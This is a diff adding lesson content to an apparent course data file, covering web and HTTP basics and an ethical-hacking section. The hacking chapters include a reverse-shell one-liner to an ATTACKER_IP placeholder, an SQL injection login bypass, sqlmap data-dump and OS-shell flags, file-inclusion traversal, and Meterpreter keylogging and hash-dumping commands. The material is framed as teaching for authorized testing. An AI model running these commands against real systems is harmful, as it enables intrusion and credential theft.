@@ -11363,24 +11363,379 @@ $ sudo systemctl restart sshd</code></pre>
   },
 
   // ===== Web & APIs (501-508) =====
-  501: { titleEn: "How the Web Works", pages: [] },
-  502: { titleEn: "HTTP in Depth", pages: [] },
-  503: { titleEn: "REST APIs", pages: [] },
-  504: { titleEn: "Authentication & Authorization", pages: [] },
-  505: { titleEn: "Browser Internals", pages: [] },
-  506: { titleEn: "API Security", pages: [] },
-  507: { titleEn: "Tools — Postman, curl, DevTools", pages: [] },
-  508: { titleEn: "Real-World Patterns", pages: [] },
+  501: {
+    titleEn: "How the Web Works",
+    pages: [
+      {
+        titleEn: "Client-Server Model — From Browser to Server and Back",
+        contentEn: `
+          <p>Every interaction on the Internet is based on the <strong>Client-Server</strong> model.</p>
+          <p>Your browser is the <strong>client</strong> — it sends a <strong>request</strong> to a remote server.</p>
+          <p>The server processes the request and returns a <strong>response</strong> — usually an HTML page, a JSON file, or an image.</p>
+          <p><strong>The basic flow:</strong></p>
+          <ul>
+            <li>The user types an address in the browser or clicks a link</li>
+            <li>The browser builds an HTTP request and sends it to the server</li>
+            <li>The server receives the request and processes it (gets data from a database, runs logic)</li>
+            <li>The server returns a response with a status code and content</li>
+            <li>The browser receives the response and shows it to the user</li>
+          </ul>
+          <p>Note: the client always <strong>starts</strong> the communication. The server only <strong>responds</strong>.</p>
+          <p>This is different from WebSockets, where both sides can send messages at any time.</p>
+        `
+      },
+      {
+        titleEn: "URL Anatomy — What Is Hidden in the Address?",
+        contentEn: `
+          <p>Every web address (<code>URL</code> — Uniform Resource Locator) is made of defined parts:</p>
+          <div class="code-preview">
+            <pre><code>https://www.example.com:443/products/shoes?color=red&size=42#reviews
+ ──┬──   ───────┬───────  ─┬─ ──────┬────── ────────┬──────── ──┬────
+ scheme       host       port    path         query       fragment</code></pre>
+          </div>
+          <ul>
+            <li><strong>Scheme</strong> (<code>https</code>) — the protocol. <code>http</code> or <code>https</code> (encrypted)</li>
+            <li><strong>Host</strong> (<code>www.example.com</code>) — the domain name of the server</li>
+            <li><strong>Port</strong> (<code>443</code>) — the communication port. <code>80</code> for HTTP, <code>443</code> for HTTPS. Usually hidden</li>
+            <li><strong>Path</strong> (<code>/products/shoes</code>) — the path to the resource on the server</li>
+            <li><strong>Query String</strong> (<code>?color=red&size=42</code>) — extra parameters. Starts with <code>?</code>, separated by <code>&</code></li>
+            <li><strong>Fragment</strong> (<code>#reviews</code>) — an anchor inside the page. <strong>Not sent to the server</strong> — only for the browser</li>
+          </ul>
+        `
+      },
+      {
+        titleEn: "DNS — Translating Names to IP Addresses",
+        contentEn: `
+          <p>Computers communicate with numeric <code>IP</code> addresses, but people work with names like <code>google.com</code>.</p>
+          <p>The system that translates names to IP addresses is called <strong>DNS</strong> — <code>Domain Name System</code>.</p>
+          <p><strong>DNS Resolution steps:</strong></p>
+          <ul>
+            <li><strong>Step 1 — Local Cache:</strong> The browser checks if it already knows the address</li>
+            <li><strong>Step 2 — OS Cache:</strong> The operating system checks its cache + <code>/etc/hosts</code></li>
+            <li><strong>Step 3 — Recursive Resolver:</strong> A request goes to the ISP DNS server</li>
+            <li><strong>Step 4 — Root Server:</strong> If not found — one of 13 root servers points to the TLD server</li>
+            <li><strong>Step 5 — TLD Server:</strong> The <code>.com</code> server points to the Authoritative server</li>
+            <li><strong>Step 6 — Authoritative Server:</strong> Returns the real IP address</li>
+          </ul>
+          <p>This whole process happens in a few milliseconds. The result is saved in cache with a <strong>TTL</strong> (Time To Live).</p>
+        `
+      },
+      {
+        titleEn: "TCP Connection + TLS Handshake",
+        contentEn: `
+          <p>After the browser knows the server IP, it needs to create a <strong>connection</strong>.</p>
+          <p><strong>TCP Three-Way Handshake:</strong></p>
+          <ul>
+            <li><strong>SYN</strong> — the client sends a connection request</li>
+            <li><strong>SYN-ACK</strong> — the server confirms</li>
+            <li><strong>ACK</strong> — the client confirms back</li>
+          </ul>
+          <p><strong>TLS Handshake (for HTTPS):</strong></p>
+          <ul>
+            <li><strong>Client Hello</strong> — supported TLS versions + encryption algorithms</li>
+            <li><strong>Server Hello</strong> — server picks an algorithm and sends its <strong>digital certificate</strong></li>
+            <li><strong>Certificate check</strong> — browser verifies the certificate is signed by a known CA</li>
+            <li><strong>Key Exchange</strong> — both sides agree on a shared encryption key</li>
+            <li><strong>Encrypted Connection</strong> — from here all communication is encrypted</li>
+          </ul>
+          <p>In TLS 1.3, the whole process is reduced to <strong>one RTT</strong> — much faster than older versions.</p>
+        `
+      },
+      {
+        titleEn: "What Happens When You Type google.com? The Full Flow",
+        contentEn: `
+          <p>Let's follow every step from typing <code>google.com</code> and pressing Enter:</p>
+          <p><strong>1. URL parsing</strong> — the browser builds: <code>https://google.com</code></p>
+          <p><strong>2. DNS Lookup</strong> — finds the IP address (e.g. <code>142.250.185.206</code>)</p>
+          <p><strong>3. TCP Connection</strong> — SYN, SYN-ACK, ACK to port 443</p>
+          <p><strong>4. TLS Handshake</strong> — encryption setup</p>
+          <p><strong>5. HTTP Request</strong></p>
+          <div class="code-preview"><pre><code>GET / HTTP/2
+Host: google.com
+User-Agent: Mozilla/5.0 ...
+Accept: text/html</code></pre></div>
+          <p><strong>6. Server Processing</strong> — Google builds an HTML page</p>
+          <p><strong>7. HTTP Response</strong> — status 200 OK with HTML content</p>
+          <p><strong>8. Rendering</strong> — the browser reads HTML, loads CSS/JS, shows the page</p>
+          <p>This whole process usually takes <strong>less than 500 milliseconds</strong>.</p>
+        `
+      },
+      {
+        titleEn: "Summary — Chapter 501",
+        contentEn: `
+          <div class="chapter-summary">
+            <h3>Key Points:</h3>
+            <ul>
+              <li><strong>Client-Server</strong> model: browser sends request, server returns response</li>
+              <li><strong>URL</strong> is made of: scheme, host, port, path, query, fragment</li>
+              <li><strong>DNS</strong> translates domain names to IP addresses</li>
+              <li><strong>TCP Handshake</strong> — three steps (SYN, SYN-ACK, ACK)</li>
+              <li><strong>TLS Handshake</strong> — encrypts the connection</li>
+              <li>Full flow: DNS → TCP → TLS → HTTP Request → Response → Rendering</li>
+            </ul>
+          </div>
+        `
+      },
+      {}
+    ]
+  },
+  502: {
+    titleEn: "HTTP in Depth",
+    pages: [
+      {
+        titleEn: "HTTP/1.1 vs HTTP/2 vs HTTP/3",
+        contentEn: `
+          <p><strong>HTTP/1.1 (1997)</strong> — one request at a time per connection. <strong>Head-of-Line Blocking</strong> problem.</p>
+          <p><strong>HTTP/2 (2015)</strong> — <strong>multiplexing</strong> (many requests at once), header compression (HPACK), server push, binary protocol.</p>
+          <p><strong>HTTP/3 (2022)</strong> — based on <strong>QUIC</strong> (over UDP), faster connection, no Head-of-Line Blocking at transport level.</p>
+        `
+      },
+      {
+        titleEn: "HTTP Request Structure — Method, URL, Headers, Body",
+        contentEn: `
+          <p>Every HTTP request has three parts:</p>
+          <div class="code-preview"><pre><code>POST /api/users HTTP/1.1          <- Request Line
+Host: api.example.com             <- Headers
+Content-Type: application/json
+Authorization: Bearer eyJhbGc...
+
+{"name": "Dan", "email": "d@e.com"} <- Body</code></pre></div>
+          <p><strong>Request Line:</strong> Method + URL/Path + Version</p>
+          <p><strong>Headers:</strong> metadata about the request (Key: Value pairs)</p>
+          <p><strong>Body:</strong> the data itself. GET usually has no body. POST and PUT almost always include one.</p>
+        `
+      },
+      {
+        titleEn: "HTTP Response Structure — Status Code, Headers, Body",
+        contentEn: `
+          <p>The response also has three parts:</p>
+          <div class="code-preview"><pre><code>HTTP/1.1 200 OK                    <- Status Line
+Content-Type: application/json     <- Headers
+Cache-Control: max-age=3600
+
+{"id": 42, "name": "Dan"}          <- Body</code></pre></div>
+          <p><strong>Status Line:</strong> version + status code + message. The code is the important part: 200 = success, 404 = not found, 500 = server error.</p>
+        `
+      },
+      {
+        titleEn: "Important HTTP Headers",
+        contentEn: `
+          <p><strong>Content-Type:</strong> <code>application/json</code> (APIs), <code>text/html</code> (web pages), <code>multipart/form-data</code> (file uploads)</p>
+          <p><strong>Authorization:</strong> <code>Bearer eyJ...</code> (JWT token) or <code>Basic dXNl...</code> (Base64 username:password)</p>
+          <p><strong>Cache-Control:</strong> <code>max-age=3600</code> (cache 1 hour), <code>no-cache</code> (check with server), <code>no-store</code> (never save)</p>
+          <p><strong>CORS Headers:</strong> <code>Access-Control-Allow-Origin</code>, <code>Access-Control-Allow-Methods</code>, <code>Access-Control-Allow-Headers</code></p>
+        `
+      },
+      {
+        titleEn: "Status Codes — 2xx, 3xx, 4xx, 5xx",
+        contentEn: `
+          <p><strong>2xx Success:</strong> 200 OK, 201 Created, 204 No Content</p>
+          <p><strong>3xx Redirects:</strong> 301 Moved Permanently, 302 Found, 304 Not Modified</p>
+          <p><strong>4xx Client Errors:</strong> 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests</p>
+          <p><strong>5xx Server Errors:</strong> 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout</p>
+        `
+      },
+      {
+        titleEn: "Cookies and Sessions",
+        contentEn: `
+          <p>HTTP is <strong>stateless</strong> — the server does not remember previous requests. <strong>Cookies</strong> solve this.</p>
+          <p>When you log in, the server sends <code>Set-Cookie: session_id=abc123</code>. The browser sends this cookie with every next request.</p>
+          <p><strong>Cookie flags:</strong> <code>HttpOnly</code> (blocks JavaScript access), <code>Secure</code> (HTTPS only), <code>SameSite</code> (same-site only), <code>Max-Age</code> (expiration).</p>
+          <p><strong>Sessions:</strong> server stores user info and identifies by session ID in the cookie.</p>
+        `
+      },
+      {
+        titleEn: "Summary — Chapter 502",
+        contentEn: `
+          <div class="chapter-summary"><h3>Key Points:</h3>
+            <ul>
+              <li>HTTP/1.1 → HTTP/2 (multiplexing) → HTTP/3 (QUIC over UDP)</li>
+              <li>Request = request line + headers + body</li>
+              <li>Response = status code + headers + body</li>
+              <li>Status codes: 2xx success, 3xx redirect, 4xx client error, 5xx server error</li>
+              <li>Cookies keep state in a stateless protocol</li>
+            </ul>
+          </div>
+        `
+      },
+      {}
+    ]
+  },
+  503: {
+    titleEn: "REST APIs",
+    pages: [
+      { titleEn: "What Is an API? What Is REST?", contentEn: `<p><strong>API</strong> — an interface that lets programs talk to each other. <strong>REST</strong> — an architecture style based on HTTP + JSON + resources.</p><p><strong>REST rules:</strong> everything is a resource with a unique URL, standard HTTP methods (GET, POST, PUT, DELETE), stateless, JSON format.</p>` },
+      { titleEn: "HTTP Methods — GET, POST, PUT, PATCH, DELETE", contentEn: `<p><strong>GET</strong> — read data. <strong>POST</strong> — create new resource (returns 201). <strong>PUT</strong> — full update. <strong>PATCH</strong> — partial update. <strong>DELETE</strong> — delete resource.</p><p><strong>CRUD Mapping:</strong> Create=POST, Read=GET, Update=PUT/PATCH, Delete=DELETE</p>` },
+      { titleEn: "JSON Format", contentEn: `<p><strong>JSON</strong> — the standard data format for APIs. Keys in double quotes, values can be strings, numbers, booleans, null, arrays, objects. No comments, no trailing commas.</p>` },
+      { titleEn: "Query Parameters vs Path Parameters", contentEn: `<p><strong>Path Parameters</strong> identify a specific resource: <code>/users/42</code> (required).</p><p><strong>Query Parameters</strong> filter or sort: <code>/users?role=admin&sort=name</code> (optional).</p>` },
+      { titleEn: "Versioning and Documentation — Swagger/OpenAPI", contentEn: `<p><strong>API Versioning:</strong> <code>/api/v1/users</code> vs <code>/api/v2/users</code> keeps backward compatibility.</p><p><strong>Swagger/OpenAPI:</strong> interactive documentation showing endpoints, parameters, request/response examples, and a "Try it out" button.</p>` },
+      { titleEn: "Demo: Calling a Real API with curl", contentEn: `<div class="code-preview"><pre><code># GET a user
+$ curl https://jsonplaceholder.typicode.com/users/1
+
+# POST — create
+$ curl -X POST https://jsonplaceholder.typicode.com/posts \\
+  -H "Content-Type: application/json" \\
+  -d '{"title": "Hello", "body": "Content", "userId": 1}'
+
+# DELETE
+$ curl -X DELETE https://jsonplaceholder.typicode.com/posts/1</code></pre></div>` },
+      { titleEn: "Summary — Chapter 503", contentEn: `<div class="chapter-summary"><h3>Key Points:</h3><ul><li>API = interface for programs. REST = HTTP + JSON + resources</li><li>CRUD: Create=POST, Read=GET, Update=PUT/PATCH, Delete=DELETE</li><li>Path params identify resources, Query params filter/sort</li><li>Swagger/OpenAPI for interactive documentation</li></ul></div>` },
+      {}
+    ]
+  },
+  504: {
+    titleEn: "Authentication & Authorization",
+    pages: [
+      { titleEn: "Authentication vs Authorization", contentEn: `<p><strong>Authentication</strong> = "Who are you?" (logging in with username/password). <strong>Authorization</strong> = "What are you allowed to do?" (checking permissions). Authorization always comes after authentication.</p><p>HTTP 401 = authentication problem. HTTP 403 = authorization problem.</p>` },
+      { titleEn: "Basic Auth and API Keys", contentEn: `<p><strong>Basic Auth:</strong> username:password encoded in Base64. Simple but not secure — Base64 is encoding, not encryption. Use HTTPS.</p><p><strong>API Keys:</strong> a unique string identifying the application (not user). Used for rate limiting and billing.</p>` },
+      { titleEn: "OAuth 2.0", contentEn: `<p><strong>OAuth 2.0</strong> lets a third-party app access your data without your password. Example: "Sign in with Google".</p><p><strong>Flow:</strong> app redirects you to Google → you approve → Google gives app a one-time code → app exchanges code for Access Token (server-to-server) → app uses token to access your data.</p>` },
+      { titleEn: "JWT — JSON Web Tokens", contentEn: `<p><strong>JWT</strong> is a token with data inside it, digitally signed. Three parts: Header (algorithm), Payload (user data, expiration), Signature (verifies data was not changed).</p><p>JWT is <strong>signed but not encrypted</strong>. Anyone can read the Payload. Do not put passwords in it!</p>` },
+      { titleEn: "Session Tokens vs JWT", contentEn: `<p><strong>Sessions:</strong> data on server, can be revoked anytime, small cookie. <strong>JWT:</strong> data in token, no server storage needed, cannot revoke before expiration.</p><p>Use Sessions for websites, JWT for APIs and microservices.</p>` },
+      { titleEn: "Summary — Chapter 504", contentEn: `<div class="chapter-summary"><h3>Key Points:</h3><ul><li>Authentication = who are you. Authorization = what can you do</li><li>Basic Auth, API Keys, OAuth 2.0, JWT</li><li>Sessions (server-side, revocable) vs JWT (client-side, distributed)</li></ul></div>` },
+      {}
+    ]
+  },
+  505: {
+    titleEn: "Browser Internals",
+    pages: [
+      { titleEn: "Page Rendering", contentEn: `<p>Browser rendering: <strong>1.</strong> Parse HTML → DOM. <strong>2.</strong> Parse CSS → CSSOM. <strong>3.</strong> Combine → Render Tree. <strong>4.</strong> Layout (calculate sizes/positions). <strong>5.</strong> Paint (draw pixels). <strong>6.</strong> Composite (combine layers).</p><p>DOM changes cause parts of this process to repeat — frequent changes slow down the page.</p>` },
+      { titleEn: "JavaScript — Event Loop, async/await", contentEn: `<p>JavaScript runs on a <strong>single thread</strong>. The <strong>Event Loop</strong> handles async actions: Call Stack runs code, Web APIs handle async tasks (fetch, setTimeout), finished callbacks go to the Queue, Event Loop moves them to the Stack when empty.</p><p><code>await</code> does not block — it frees the thread until the result is ready.</p>` },
+      { titleEn: "Same-Origin Policy and CORS", contentEn: `<p><strong>Same-Origin Policy:</strong> browser blocks JavaScript from accessing content from a different origin (scheme + host + port).</p><p><strong>CORS:</strong> the server can allow exceptions by sending <code>Access-Control-Allow-Origin</code> headers.</p><p><strong>Preflight:</strong> for risky requests (POST with JSON, DELETE), the browser sends OPTIONS first to check.</p>` },
+      { titleEn: "Browser Storage", contentEn: `<p><strong>Cookies:</strong> sent to server automatically, ~4KB, used for session tokens.</p><p><strong>localStorage:</strong> client-side only, ~5MB, permanent. For UI preferences.</p><p><strong>sessionStorage:</strong> like localStorage but deleted when tab closes.</p>` },
+      { titleEn: "DevTools — Network, Console, Elements", contentEn: `<p>Open with F12. <strong>Elements:</strong> DOM tree, edit HTML/CSS live. <strong>Console:</strong> run JavaScript, see errors. <strong>Network:</strong> see every HTTP request with headers, payload, timing. Tip: right-click → Copy as cURL.</p>` },
+      { titleEn: "Summary — Chapter 505", contentEn: `<div class="chapter-summary"><h3>Key Points:</h3><ul><li>Rendering: HTML→DOM→CSSOM→Render Tree→Layout→Paint</li><li>Event Loop handles async on single thread</li><li>SOP blocks cross-origin. CORS allows exceptions</li><li>Cookies (server), localStorage (permanent), sessionStorage (tab)</li></ul></div>` },
+      {}
+    ]
+  },
+  506: {
+    titleEn: "API Security",
+    pages: [
+      { titleEn: "Common API Vulnerabilities", contentEn: `<p><strong>BOLA/IDOR</strong> (#1 OWASP) — access others' data by changing ID in URL. <strong>Broken Auth</strong> — tokens that never expire. <strong>Excessive Data Exposure</strong> — returning too much data. <strong>Injection</strong> — SQL/command injection through input. <strong>Mass Assignment</strong> — client sends unauthorized fields.</p>` },
+      { titleEn: "Rate Limiting and Throttling", contentEn: `<p><strong>Rate Limiting</strong> restricts requests per time period. Protects from DDoS, brute force, overuse. Returns 429 Too Many Requests. Strategies: Fixed Window, Sliding Window, Token Bucket.</p><p><strong>Throttling</strong> slows requests instead of rejecting them.</p>` },
+      { titleEn: "Input Validation", contentEn: `<p>Golden rule: <strong>never trust client input</strong>. Check types, lengths, ranges, use allowlists, sanitize HTML. Use <strong>parameterized queries</strong> (not string concatenation) to prevent SQL Injection.</p>` },
+      { titleEn: "HTTPS Everywhere", contentEn: `<p>HTTP sends everything as plain text — anyone in the middle can read it. <strong>HTTPS = HTTP + TLS:</strong> encrypted, verified server identity, data integrity. Let's Encrypt provides free certificates.</p>` },
+      { titleEn: "CORS Misconfiguration", contentEn: `<p>Common mistakes: using <code>*</code> for Allow-Origin, reflecting the Origin header, using credentials with wildcard. Fix: use a specific list of allowed origins.</p>` },
+      { titleEn: "Summary — Chapter 506", contentEn: `<div class="chapter-summary"><h3>Key Points:</h3><ul><li>BOLA/IDOR is #1 API vulnerability</li><li>Rate Limiting protects from DDoS and brute force</li><li>Always validate input server-side</li><li>Always use HTTPS. Configure CORS correctly</li></ul></div>` },
+      {}
+    ]
+  },
+  507: {
+    titleEn: "Tools \u2014 Postman, curl, DevTools",
+    pages: [
+      { titleEn: "Postman", contentEn: `<p><strong>Postman</strong> — graphical tool for building and testing API requests. Features: Collections (organize requests), Environment Variables (switch between dev/prod), Tests (automatic response checks), History.</p>` },
+      { titleEn: "curl — HTTP from the Command Line", contentEn: `<div class="code-preview"><pre><code># GET
+$ curl https://api.example.com/users
+
+# POST with JSON
+$ curl -X POST https://api.example.com/users \\
+  -H "Content-Type: application/json" \\
+  -d '{"name": "Dan"}'
+
+# Flags: -X method, -H header, -d data, -v verbose, -o file, -s silent</code></pre></div>` },
+      { titleEn: "Browser DevTools — Network Tab", contentEn: `<p>Open DevTools (F12) → Network tab → filter by Fetch/XHR for API requests. For each request see Headers, Payload, Response, Timing. Tips: Copy as cURL, Replay XHR, Throttling (simulate slow network), Preserve log.</p>` },
+      { titleEn: "Swagger/OpenAPI Documentation", contentEn: `<p><strong>Swagger UI</strong> — interactive API docs. Shows endpoints, parameters, request/response examples, and a "Try it out" button. How to read: find endpoint → check if auth needed → read parameters → check body format → review response examples.</p>` },
+      { titleEn: "Summary — Chapter 507", contentEn: `<div class="chapter-summary"><h3>Key Points:</h3><ul><li>Postman: graphical API testing with Collections and Variables</li><li>curl: command-line HTTP tool</li><li>DevTools Network: inspect all browser requests</li><li>Swagger: interactive API documentation</li></ul></div>` },
+      {}
+    ]
+  },
+  508: {
+    titleEn: "Real-World Patterns",
+    pages: [
+      { titleEn: "Webhooks — Push Instead of Pull", contentEn: `<p><strong>Webhooks</strong> flip the direction — the server sends a POST to your URL when an event happens (Push). Much more efficient than Polling (asking every 5 seconds). Used for payment updates (Stripe), CI/CD (GitHub), notifications (Slack).</p>` },
+      { titleEn: "WebSockets — Real-Time Communication", contentEn: `<p><strong>WebSocket</strong> — permanent two-way connection. Opens with HTTP upgrade, then both sides can send messages at any time. Used for chat, live stock prices, online games, collaborative editing (Google Docs).</p>` },
+      { titleEn: "GraphQL — An Alternative to REST", contentEn: `<p><strong>GraphQL</strong> (by Facebook) — the client defines exactly what data it wants in one query. Solves REST problems: over-fetching (too many fields) and under-fetching (too many requests). REST is simpler for basic CRUD; GraphQL is better for complex systems.</p>` },
+      { titleEn: "Pagination, Filtering, Sorting", contentEn: `<p><strong>Pagination:</strong> Offset-based (<code>?page=3&limit=20</code>), Cursor-based (<code>?after=abc&limit=20</code>), or Link headers.</p><p><strong>Filtering:</strong> <code>?category=electronics&min_price=100</code></p><p><strong>Sorting:</strong> <code>?sort=price&order=asc</code></p>` },
+      { titleEn: "Summary — Chapter 508", contentEn: `<div class="chapter-summary"><h3>Key Points:</h3><ul><li>Webhooks: server pushes events (better than polling)</li><li>WebSockets: permanent two-way connection for real-time data</li><li>GraphQL: client defines exact data needed</li><li>Pagination, Filtering, Sorting for large collections</li></ul></div>` },
+      {}
+    ]
+  },
 
   // ===== Red Team (601-608) =====
-  601: { titleEn: "Introduction to Ethical Hacking", pages: [] },
-  602: { titleEn: "Kali Linux Setup", pages: [] },
-  603: { titleEn: "Reconnaissance", pages: [] },
-  604: { titleEn: "Scanning & Enumeration", pages: [] },
-  605: { titleEn: "Web Vulnerabilities", pages: [] },
-  606: { titleEn: "Exploitation Basics", pages: [] },
-  607: { titleEn: "Password Attacks", pages: [] },
-  608: { titleEn: "Report Writing", pages: [] },
+  601: {
+    titleEn: "Introduction to Ethical Hacking",
+    pages: [
+      { titleEn: "What Is Ethical Hacking?", contentEn: `<p><strong>Ethical Hacking</strong> uses attacker techniques with <strong>explicit permission</strong> to find and fix security weaknesses.</p><ul><li><strong>White Hat</strong> — ethical hacker, works with permission, reports findings</li><li><strong>Black Hat</strong> — malicious hacker, no permission, steals or destroys</li><li><strong>Grey Hat</strong> — no explicit permission, no bad intent (still illegal!)</li></ul><p>The difference: written permission, good intent, full reporting.</p>` },
+      { titleEn: "The Legal Side", contentEn: `<p>Breaking into a computer without permission is a criminal offense in most countries (up to 5 years prison in Israel, CFAA in USA, GDPR fines in Europe).</p><p><strong>Legal hacking requires:</strong> written agreement, defined scope, time window, or Bug Bounty program.</p><p><strong>Always illegal:</strong> scanning without permission, using found data personally, going beyond agreed scope.</p>` },
+      { titleEn: "Penetration Testing — 5 Steps", contentEn: `<ul><li><strong>1. Reconnaissance</strong> — collect info about the target</li><li><strong>2. Scanning</strong> — scan ports, services, versions</li><li><strong>3. Exploitation</strong> — exploit vulnerabilities to gain access</li><li><strong>4. Post-Exploitation</strong> — escalate privileges, move laterally</li><li><strong>5. Reporting</strong> — document findings and recommendations</li></ul>` },
+      { titleEn: "Responsible Disclosure", contentEn: `<p>Found a bug? Check for Bug Bounty program, report to the security team, give 90 days to fix, publish only after the fix (with coordination).</p><p>Platforms: <strong>HackerOne</strong>, <strong>Bugcrowd</strong>, <strong>Google VRP</strong> (up to $31,337).</p>` },
+      {}
+    ]
+  },
+  602: {
+    titleEn: "Kali Linux Setup",
+    pages: [
+      { titleEn: "What Is Kali Linux?", contentEn: `<p><strong>Kali Linux</strong> — Debian-based distribution with 600+ security tools pre-installed (Nmap, Burp Suite, Metasploit, Wireshark).</p><p><strong>Installation options:</strong> VirtualBox (safest for beginners), WSL2, Dual Boot, USB Live.</p>` },
+      { titleEn: "Installing on VirtualBox", contentEn: `<p>Download OVA from kali.org. Import into VirtualBox. Settings: 4GB RAM, 2 CPUs, 80GB disk.</p><p>Default login: <code>kali / kali</code>. Change password immediately with <code>passwd kali</code>.</p><p>Network modes: NAT (internet only), Bridged (local network), Host-Only (isolated).</p>` },
+      { titleEn: "Essential Tools", contentEn: `<p>Key tools: <code>nmap</code> (port scanning), <code>wireshark</code> (traffic analysis), <code>burpsuite</code> (web testing), <code>msfconsole</code> (Metasploit), <code>john</code>/<code>hashcat</code> (password cracking), <code>dirb</code>/<code>gobuster</code> (directory scanning), <code>sqlmap</code> (SQL injection), <code>theHarvester</code> (OSINT).</p>` },
+      { titleEn: "Updating Kali", contentEn: `<p><code>sudo apt update && sudo apt full-upgrade -y</code></p><p><strong>Practice environments:</strong> HackTheBox, TryHackMe, DVWA (Damn Vulnerable Web App), VulnHub.</p>` },
+      {}
+    ]
+  },
+  603: {
+    titleEn: "Reconnaissance",
+    pages: [
+      { titleEn: "What Is Reconnaissance?", contentEn: `<p>The first step in pen testing. <strong>Passive</strong> — no direct contact (Google, Whois). <strong>Active</strong> — direct contact, may appear in logs (port scanning). Look for: IPs, subdomains, emails, technologies, leaked data.</p>` },
+      { titleEn: "OSINT — Whois and DNS", contentEn: `<p><code>whois example.com</code> — domain registration info. <code>dig example.com ANY</code> — DNS records. <code>dnsrecon -d example.com -t brt</code> — subdomain brute force. Online: crt.sh, SecurityTrails, DNSdumpster.</p>` },
+      { titleEn: "theHarvester and Google Dorking", contentEn: `<p><code>theHarvester -d example.com -b google,bing,linkedin</code> — find emails, subdomains, IPs.</p><p>Google Dorks: <code>site:example.com filetype:pdf</code>, <code>site:example.com inurl:admin</code>, <code>site:example.com ext:env</code>. Legal to search, but using found data without permission is not!</p>` },
+      { titleEn: "Shodan", contentEn: `<p><strong>Shodan</strong> indexes connected devices (servers, cameras, IoT). Filters: <code>port:X</code>, <code>country:XX</code>, <code>org:"Company"</code>, <code>vuln:CVE-XXXX</code>.</p>` },
+      { titleEn: "Social Engineering", contentEn: `<p>Exploits the human factor. <strong>Phishing</strong> (fake emails), <strong>Pretexting</strong> (fake scenarios), <strong>Baiting</strong> (infected USB), <strong>Tailgating</strong> (following through secured doors). OSINT via LinkedIn, GitHub, social media. Requires separate permission in pen tests!</p>` },
+      {}
+    ]
+  },
+  604: {
+    titleEn: "Scanning & Enumeration",
+    pages: [
+      { titleEn: "What Is Scanning?", contentEn: `<p>Map the attack surface: find open ports, running services, software versions, and OS type.</p>` },
+      { titleEn: "Nmap — Types of Scans", contentEn: `<p><code>sudo nmap -sS</code> (SYN scan, fast), <code>-sV</code> (version detection), <code>-O</code> (OS detection), <code>-A</code> (aggressive), <code>-sU</code> (UDP), <code>-p-</code> (all 65535 ports), <code>-sn</code> (ping sweep).</p>` },
+      { titleEn: "Nmap Scripts (NSE)", contentEn: `<p><code>--script vuln</code> (vulnerability scan), <code>--script ssl-enum-ciphers</code> (SSL check). Port states: open (service listening), closed (no service), filtered (firewall blocks). Save results with <code>-oN file.txt</code>.</p>` },
+      { titleEn: "Directory Brute Force", contentEn: `<p><code>dirb http://target /usr/share/wordlists/dirb/common.txt</code>. <code>gobuster dir -u http://target -w wordlist -x php,txt,bak</code> (faster). Banner grabbing: <code>curl -I http://target</code>.</p>` },
+      { titleEn: "Enumeration", contentEn: `<p>SMB: <code>enum4linux -a target</code>. Web: <code>nikto -h http://target</code>. Technology ID: <code>whatweb example.com</code>.</p>` },
+      {}
+    ]
+  },
+  605: {
+    titleEn: "Web Vulnerabilities",
+    pages: [
+      { titleEn: "XSS — Cross-Site Scripting", contentEn: `<p>Attacker injects JavaScript shown to other users. <strong>Reflected:</strong> from URL, needs victim click. <strong>Stored:</strong> saved in DB, affects every visitor (most dangerous). <strong>DOM-based:</strong> client-side only. Protection: output encoding, CSP, input sanitization.</p>` },
+      { titleEn: "SQL Injection", contentEn: `<p>Inject SQL through user input. Example: <code>admin' --</code> bypasses login. Types: Union-Based, Boolean Blind, Time-Based Blind. Protection: <strong>Prepared Statements / Parameterized Queries</strong>.</p>` },
+      { titleEn: "SQLMap", contentEn: `<p><code>sqlmap -u "http://target/page?id=1" --batch</code> (test), <code>--dbs</code> (databases), <code>-D db -T users --dump</code> (extract data). Flags: <code>--level 3</code>, <code>--risk 3</code>, <code>--os-shell</code>.</p>` },
+      { titleEn: "CSRF, SSRF, File Inclusion", contentEn: `<p><strong>CSRF:</strong> force logged-in user to perform unwanted action. Fix: CSRF tokens. <strong>SSRF:</strong> force server to make internal requests. Fix: domain whitelist. <strong>LFI:</strong> read local files (<code>../../etc/passwd</code>). <strong>RFI:</strong> load remote code. Fix: never include files from user input.</p>` },
+      { titleEn: "Burp Suite", contentEn: `<p>Proxy between browser and server. <strong>Proxy</strong> (intercept), <strong>Repeater</strong> (resend modified), <strong>Intruder</strong> (brute force), <strong>Scanner</strong> (auto-scan, Pro only). Setup: browser proxy to 127.0.0.1:8080, install Burp CA certificate.</p>` },
+      { titleEn: "Summary — Web Vulnerabilities", contentEn: `<p>XSS → output encoding. SQLi → prepared statements. CSRF → tokens. SSRF → whitelist. LFI/RFI → never include from user input. <strong>Golden rule: never trust user input.</strong></p>` },
+      {}
+    ]
+  },
+  606: {
+    titleEn: "Exploitation Basics",
+    pages: [
+      { titleEn: "Metasploit Framework", contentEn: `<p>Main exploitation tool. Structure: Exploits (exploit code), Payloads (what happens after), Auxiliary (scanners), Encoders (avoid antivirus), Post (post-exploitation). Usage: <code>msfconsole → search → use → set RHOSTS/LHOST/PAYLOAD → exploit</code>.</p>` },
+      { titleEn: "Reverse Shell", contentEn: `<p>Target connects back to attacker — bypasses firewalls. Attacker listens: <code>nc -lvnp 4444</code>. Target runs: <code>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>. Upgrade shell: <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>.</p>` },
+      { titleEn: "Meterpreter", contentEn: `<p>Advanced Metasploit payload: <code>sysinfo</code>, <code>getuid</code>, <code>download/upload</code>, <code>screenshot</code>, <code>keyscan_start/dump</code>, <code>getsystem</code> (escalate), <code>hashdump</code> (extract hashes).</p>` },
+      { titleEn: "Privilege Escalation", contentEn: `<p><strong>Linux:</strong> SUID binaries (<code>find / -perm -4000</code>), sudo permissions (<code>sudo -l</code>), cron jobs, writable /etc/passwd, kernel exploits. <strong>Tools:</strong> LinPEAS, WinPEAS, GTFOBins.</p>` },
+      { titleEn: "Post-Exploitation", contentEn: `<p>After access: <strong>Persistence</strong> (backdoors, SSH keys), <strong>Data collection</strong> (credentials, config files), <strong>Lateral Movement</strong> (move to other machines). In a real pen test — document everything, never delete logs or leave backdoors.</p>` },
+      {}
+    ]
+  },
+  607: {
